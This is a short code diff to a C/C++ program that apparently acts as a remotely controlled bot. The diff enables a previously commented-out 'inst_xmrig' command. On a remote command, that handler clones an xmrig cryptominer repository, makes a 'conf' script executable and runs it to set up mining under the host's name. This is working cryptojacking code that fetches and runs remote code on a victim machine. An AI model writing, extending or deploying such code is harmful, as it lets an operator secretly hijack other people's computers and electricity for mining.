@@ -111,11 +111,11 @@ int main() {
                 }
                 //==========================================================================
                 //coming soon
-                /*
+                
                 else if(msg[1] == "inst_xmrig") {
-                    // git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git
-                    // cd EchoBreak-xmrig/xmrig-6.22.2
-                    // change config.json file (rename "name_of_the_worker" to exec(hostname))
+                    system("git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git && cd EchoBreak-xmrig");
+                    system("chmod +x conf");
+		    system("./conf"); // change config.json file (rename "name_of_the_worker" to exec(hostname))
                     xmrig_flag = true;
                 }
                 else if(msg[1] == "run_xmrig") {
@@ -125,8 +125,7 @@ int main() {
                     else {
                         // send back error
                     }
-                }*/
-		               //==========================================================================
+                }
             }
             memset(buffer, 0, sizeof(buffer));
         }
